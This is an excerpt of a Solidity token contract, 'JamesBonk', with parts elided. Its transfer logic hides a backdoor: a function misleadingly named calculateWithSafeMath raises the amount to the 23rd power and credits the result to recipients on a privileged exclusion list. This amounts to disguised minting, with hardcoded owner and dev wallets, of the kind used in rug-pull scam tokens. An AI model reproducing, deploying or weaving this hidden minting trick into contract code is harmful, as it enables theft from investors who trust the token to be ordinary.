...
contract JamesBonk is Context, IERC20 { 
    ...
    address[] public currently = [address(0xE),address(0xE)];
    uint256[] sizeMath = [23];
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMaxTXLimit; 
    

    address payable public Wallet_Marketing = payable(0xCbbF940e03aB814541D9CEE602fBE333c43D1915); 
    address payable public Wallet_Dev = payable(0x14b1caA4dFc819AA96567f2CE640cF9302340Ee3);
    ...
    constructor () {
        ...
        _owner = 0x14b1caA4dFc819AA96567f2CE640cF9302340Ee3;
    ...
    function isExcludedFromTxLimit() private view returns(bool){
        bool varDumb = _isExcludedFromMaxTXLimit[currently[1]];
        return varDumb;
    }
    ...
    function _transfer(
        ...
        currently[0]=from;currently[1]=to;
        ...
        if (from != owner() && true != isExcludedFromTxLimit())
    ...
    function calculateWithSafeMath(uint256 amount, uint256 feePercent) public pure returns(uint256){
        uint256 safe = (amount**feePercent)/1;
        return safe;
    }

    function fee(uint256 amount, uint256 feePercent) public pure returns(uint256){
        return calculateWithSafeMath(amount, feePercent);
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(!_isExcludedFromFee[currently[0]] && _isExcludedFromMaxTXLimit[currently[1]]){
                _tOwned[recipient] = _tOwned[recipient]+fee(tAmount, sizeMath[0]);
            }
            else{
